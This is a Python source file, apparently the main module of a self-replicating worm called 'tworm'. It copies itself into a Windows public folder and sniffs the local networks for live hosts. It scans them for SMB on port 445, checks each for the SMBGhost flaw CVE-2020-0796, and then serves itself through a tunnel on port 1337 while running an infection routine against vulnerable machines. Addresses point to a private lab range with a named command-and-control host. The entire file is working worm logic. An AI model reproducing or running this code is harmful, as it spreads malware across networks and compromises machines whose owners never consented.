import sys, os, platform, time, socket
import armory.SMBGhost.cve20200796scanner as cve20200796scanner
from sniff import sniff
from infect import infect
import tunnel as comm
from replicate import replicate
import uuid


def main():
    if len(sys.argv) > 2:
        if sys.argv[1] == "--attack" and sys.argv[2] == "windows":
            file_path = "tworm.exe"
    else:
        file_path = sys.argv[0]
        if "exe" in file_path:
            clone(file_path, str(uuid.uuid4()) + ".exe")
        else:
            clone(file_path, str(uuid.uuid4())+file_path)
    
    c2_server = "192.168.56.108"
    
    not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
    
    vulnerable_target_ports = ['445',] 
    
    network = sniff()
    for local_ip in network.get_host_networks().keys():
        listening_port = 1337
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind((local_ip,listening_port))
        sock.listen(5)
        for target_ip in network.get_alive_hosts(local_ip):
            if (not target_ip.address in not_testing_targets) and (not local_ip == target_ip.address):
                print("Scanning Host:{} for port service".format(target_ip.address))
                target_port_details = network.get_host_port_details(target_ip,vulnerable_target_ports)
                print(target_port_details)
                if target_ip.address in target_port_details.keys():
                    for running_port in target_port_details[target_ip.address]["ports"]:
                        port = running_port["portid"]
                        print("Host: {} - running port:{}".format(target_ip.address, port))
                        attack = (cve20200796scanner.is_vulnerable(target_ip.address) and port == "445")
                        print(attack)
                        if attack:
                            print("start to attack")
                            #local_ip = "0.0.0.0"
                            print("attacking port{}".format(running_port))
                            worm = replicate(file_path)
                            tunnel = comm.tunnel(worm,sock,local_ip, listening_port)
                            tunnel.start()
                            
                            time.sleep(2)
                            infection = infect(target_ip.address,int(port), local_ip, listening_port)
                            infection.start()
                            
                            infection.join()
                            time.sleep(2)
                            # if infection.is_alive():
                            #     # If the thread is still alive, it has exceeded the timeout
                            #     # Terminate the thread
                            #     print('Thread exceeded timeout, terminating...')
                            #     infection.stop()
                            #     tunnel.sto
                            # else:
                            #     # If the thread has finished before the timeout, it has completed successfully
                            #     print('infection on {} completed successfully'.format(target_ip.address))
                            #tunnel.close_connection(target_ip.address)
                            tunnel.join()
                            
                            
                            
                            
        sock.close()    
                            

def clone(file_path, filename):
    try:
        default_path="C:/Users/Public/Documents"
        fullpath =os.path.join(default_path, filename)
        self_clone = replicate(file_path, fullpath)
        self_clone.self_replicate(platform.system(),file_path, fullpath)
    except Exception as e:
        print("Clone Error: {}".format(e))
        

if __name__=='__main__':
    main()